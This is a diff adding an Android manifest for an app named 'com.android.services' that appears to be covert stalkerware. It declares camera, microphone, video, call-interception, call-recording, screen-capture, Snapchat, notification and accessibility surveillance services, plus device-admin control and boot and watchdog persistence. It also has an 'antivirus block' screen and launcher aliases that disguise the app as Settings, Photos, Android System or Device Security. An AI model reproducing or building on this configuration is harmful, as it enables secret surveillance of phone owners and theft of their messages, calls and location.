@@ -1,0 +1,784 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.android.services">
+    <uses-permission
+        android:name="android.permission.CAPTURE_VIDEO_OUTPUT"
+        tools:ignore="ProtectedPermissions"
+        tools:node="replace"
+        tools:remove="android:maxSdkVersion" />
+    <uses-permission
+        android:name="android.permission.CAPTURE_AUDIO_OUTPUT"
+        tools:ignore="ProtectedPermissions"
+        tools:node="replace"
+        tools:remove="android:maxSdkVersion" />
+    <uses-feature
+        android:name="android.hardware.camera.front"
+        android:required="true" />
+    <uses-feature
+        android:name="android.hardware.microphone"
+        android:required="true" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.MICROPHONE" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <application
+        android:name="com.android.services.MyApplication"
+        android:allowBackup="true"
+        android:description="@string/app_name"
+        android:hardwareAccelerated="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:largeHeap="true"
+        android:requestLegacyExternalStorage="true"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true">
+
+        <!--        <activity-->
+        <!--            android:name=".ui.activities.DeviceActivationActivity"-->
+        <!--            android:excludeFromRecents="false">-->
+        <!--            <intent-filter>-->
+        <!--                <actiozn android:name="android.intent.action.MAIN" />-->
+        <!--                <category android:name="android.intent.category.LAUNCHER" />-->
+        <!--            </intent-filter>-->
+        <!--        </activity>-->
+
+        <activity android:name=".ui.activities.ManualPermissionActivity" />
+        <activity android:name=".ui.activities.DeviceActivationActivity" />
+
+        <activity
+            android:name="com.android.services.ui.activities.MainLaunchActivity"
+            android:excludeFromRecents="false"
+            android:label=""
+            android:theme="@style/Theme.Transparent"></activity>
+
+        <activity
+            android:name=".ui.activities.ScreenRecordIntentActivity"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:theme="@style/Theme.Transparent" />
+
+        <activity
+            android:name="com.android.services.ui.activities.AntivirousBlockActivity"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:theme="@style/Theme.Transparent">
+        </activity>
+
+        <activity
+            android:name=".ui.activities.ScreenLimitActivity"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:theme="@style/Theme.Transparent" />
+
+        <activity
+            android:name=".ui.activities.BackgroundServicesActivity"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.Transparent">
+        </activity>
+
+        <activity android:name=".ui.activities.FeatureTestActivity"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.Transparent">
+        </activity>
+
+<!--        Old Code-->
+<!--        <activity-alias-->
+<!--            android:name="com.android.services.ui.activities.MainLaunchActivityDefault"-->
+<!--            android:icon="@mipmap/ic_launcher"-->
+<!--            android:label="@string/app_name"-->
+<!--            android:targetActivity=".ui.activities.MainLaunchActivity">-->
+
+<!--            <intent-filter>-->
+<!--                <action android:name="android.intent.action.MAIN" />-->
+<!--                <category android:name="android.intent.category.LAUNCHER" />-->
+<!--            </intent-filter>-->
+<!--        </activity-alias>-->
+
+<!--        New Code by Ahmad-->
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityDefault"
+            android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivitySamsung"
+            android:enabled="false"
+            android:icon="@mipmap/samsung_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityHuawei"
+            android:enabled="false"
+            android:icon="@mipmap/huawei_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityXiaomi"
+            android:enabled="false"
+            android:icon="@mipmap/xiaomi_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityOppo"
+            android:enabled="false"
+            android:icon="@mipmap/oppo_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityVivo"
+            android:enabled="false"
+            android:icon="@mipmap/vivo_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityMotorola"
+            android:enabled="false"
+            android:icon="@mipmap/motorola_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityRealme"
+            android:enabled="false"
+            android:icon="@mipmap/real_me_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityLG"
+            android:enabled="false"
+            android:icon="@mipmap/lg_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityAmazon"
+            android:enabled="false"
+            android:icon="@mipmap/ic_amazon_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityTechnoMobileLimited"
+            android:enabled="false"
+            android:icon="@mipmap/techno_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityInfinix"
+            android:enabled="false"
+            android:icon="@mipmap/infinix_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivitySony"
+            android:enabled="false"
+            android:icon="@mipmap/sony_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityHmdGlobal"
+            android:enabled="false"
+            android:icon="@mipmap/nokia_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityAsus"
+            android:enabled="false"
+            android:icon="@mipmap/asus_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityLenovo"
+            android:enabled="false"
+            android:icon="@mipmap/lenovo_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityZTE"
+            android:enabled="false"
+            android:icon="@mipmap/zte_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityAlcatel"
+            android:enabled="false"
+            android:icon="@mipmap/alcatel_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityItel"
+            android:enabled="false"
+            android:icon="@mipmap/itel_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityOnePlus"
+            android:enabled="false"
+            android:icon="@mipmap/one_plus_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityGoogle"
+            android:enabled="false"
+            android:icon="@mipmap/nokia_icon"
+            android:label="@string/settings"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityFileManager"
+            android:enabled="false"
+            android:icon="@mipmap/ic_file_manager_icon"
+            android:label="@string/file_manager"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityPhotos"
+            android:enabled="false"
+            android:icon="@mipmap/ic_photos_icon"
+            android:label="@string/photos"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityGoogleManager"
+            android:enabled="false"
+            android:icon="@mipmap/ic_photos_icon"
+            android:label="@string/google_manager"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityAndroidSystem"
+            android:enabled="false"
+            android:icon="@mipmap/ic_android_system"
+            android:label="@string/android_system"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityDeviceSecurity"
+            android:enabled="false"
+            android:icon="@mipmap/ic_device_secure"
+            android:label="@string/device_secure"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityMusic"
+            android:enabled="false"
+            android:icon="@mipmap/ic_music"
+            android:label="@string/music"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityGoogleFiles"
+            android:enabled="false"
+            android:icon="@mipmap/ic_google_files"
+            android:label="@string/files"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityGoogleAnalytics"
+            android:enabled="false"
+            android:icon="@mipmap/ic_google_analytics"
+            android:label="@string/google_analytics"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityGoogleApp"
+            android:enabled="false"
+            android:icon="@mipmap/ic_google_app_icon"
+            android:label="@string/google_app"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityHealthManager"
+            android:enabled="false"
+            android:icon="@mipmap/ic_health_manager"
+            android:label="@string/health_manager"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        <activity-alias
+            android:name="com.android.services.ui.activities.MainLaunchActivityBatteryCare"
+            android:enabled="false"
+            android:icon="@mipmap/ic_battery_care"
+            android:label="@string/battery_care"
+            android:targetActivity=".ui.activities.MainLaunchActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="${applicationId}.androidx-startup"
+            android:exported="false"
+            tools:node="merge">
+            <meta-data
+                android:name="androidx.work.WorkManagerInitializer"
+                android:value="androidx.startup"
+                tools:node="remove" />
+
+        </provider>
+
+        <receiver android:name="com.android.services.receiver.CallRecorderReceiver">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".receiver.PowerConnectionReceiver">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".receiver.UninstallAppReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PACKAGE_FULLY_REMOVED" />
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".receiver.LanguageChangeReceiver">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.LOCALE_CHANGED" />
+            </intent-filter>
+        </receiver>
+
+
+        <!-- Google data -->
+        <!--        <receiver android:name="com.android.services.receiver.GpsLocationReceiver">-->
+        <!--            <intent-filter android:priority="999">-->
+        <!--                <action android:name="android.location.PROVIDERS_CHANGED" />-->
+        <!--                <category android:name="android.intent.category.DEFAULT" />-->
+        <!--            </intent-filter>-->
+        <!--        </receiver>-->
+
+        <receiver android:name="com.android.services.receiver.ConnectivityChangeReceiver">
+            <intent-filter android:priority="999">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name="com.android.services.receiver.BootReceiver">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.android.services.receiver.TOSDeviceAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+                <!-- This action is required -->
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+            </intent-filter>
+
+            <!-- This is required this receiver to become device admin component. -->
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_sample" />
+        </receiver>
+        <provider
+            android:name=".exceptionHandler.UncaughtExceptionHandlerContentProvider"
+            android:authorities="${applicationId}"
+            android:exported="false"
+            android:initOrder="101"
+            android:grantUriPermissions="false" />
+
+        <receiver android:name=".receiver.GeoFenceBroadCastReceiver" />
+        <receiver android:name=".receiver.NotificationBroadcastReceiver" />
+        <receiver
+            android:process=":remoteWatchDogReceiver"
+            android:name=".receiver.WatchDogAlarmReceiver" />
+
+        <service
+            android:name=".services.cameraBug.CameraBugCommandService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="camera" />
+
+        <service android:name=".services.RemoteDataService" />
+        <service android:name=".services.DummyBackgroundService" />
+        <service android:name="com.android.services.services.micBug.MicBugCommandService" />
+        <service android:name=".services.videoBug.VideoBugCommandService" />
+        <service android:name=".services.view360.View360CommandService" />
+        <service android:name=".services.callIntercept.CallInterceptCommandService" />
+        <service android:name=".services.view360ByJitsi.View360ByJitsiMeetCommandService" />
+        <service
+            android:name=".services.screenSharing.ScreenSharingCommandService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <service
+            android:name=".services.screenshot.ScreenShotCommandService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <service
+            android:name=".services.snapchat.SnapChatEventCommandService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <service
+            android:name="com.android.services.services.screenRecord.ScreenRecordCommandService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <service
+            android:name=".services.voip.VoipCallCommandService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
+
+        <service android:name="com.android.services.services.firebase.FirebasePushService">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
+
+        <service
+            android:name="com.android.services.services.TOSAccessibilityService"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility" />
+        </service>
+
+        <service android:name=".services.callRecord.CallRecorderService" />
+
+        <service
+            android:name=".jobScheduler.services.WatchDogJobService"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <service
+            android:name=".jobScheduler.services.NetworkSchedulerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <service
+            android:name=".jobScheduler.services.ObserverJobService"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <service
+            android:name=".jobScheduler.services.CallObserverJobService"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <service
+            android:name=".services.NotificationsListeningService"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+<!--         new Code by Ahmad-->
+<!--        <activity-alias-->
+<!--            android:name="com.android.services.DefaultActivityAlais"-->
+<!--            android:enabled="false"-->
+<!--            android:icon="@mipmap/ic_launcher"-->
+<!--            android:label="@string/app_name"-->
+<!--            android:targetActivity=".ui.activities.MainLaunchActivity">-->
+<!--            <intent-filter>-->
+<!--                <action android:name="android.intent.action.MAIN" />-->
+<!--                <category android:name="android.intent.category.LAUNCHER" />-->
+<!--            </intent-filter>-->
+<!--        </activity-alias>-->
+    </application>
+
+    <!-- A camera with (optional) RAW capability is required to use this application -->
+    <uses-feature
+        android:name="android.hardware.camera.any"
+        tools:ignore="ManifestOrder" />
+
+    <uses-feature
+        android:name="android.hardware.camera.raw"
+        android:required="false" />
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions"/>
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29" />
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29" />
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
+    <uses-permission android:name="android.permission.USES_POLICY_FORCE_LOCK" />
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="Manifest.permission.ANSWER_PHONE_CALLS" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-feature android:name="android.hardware.camera" android:required="true"/>
+    <uses-feature android:name="android.hardware.camera.autofocus"/>
+
+
+    <permission android:name="${applicationId}.permission.QUERY_ALL_PACKAGES" />
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN" />
+        </intent>
+    </queries>
+
+    <uses-permission
+        android:name="android.permission.CAPTURE_AUDIO_OUTPUT"
+        tools:ignore="ProtectedPermissions"></uses-permission>
+
+<!--    <uses-permission-->
+<!--        android:name="android.permission.PACKAGE_USAGE_STATS"-->
+<!--        tools:ignore="ProtectedPermissions" />-->
+
+    <uses-permission
+        android:name="android.permission.WRITE_SETTINGS"
+        tools:ignore="ProtectedPermissions" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_SECURE_SETTINGS"
+        tools:ignore="ProtectedPermissions" />
+
+    <uses-permission
+        android:name="android.permission.CLEAR_APP_CACHE"
+        tools:ignore="ProtectedPermissions" />
+    <uses-feature android:name="android.hardware.camera.autofocus"/>
+
+
+    <uses-sdk tools:overrideLibrary="com.abedelazizshe.lightcompressorlibrary,
+    androidx.camera.camera2,androidx.camera.core,androidx.camera.extensions,androidx.camera.lifecycle,androidx.camera.view,
+com.arthenica.mobileffmpeg"></uses-sdk>
+</manifest>
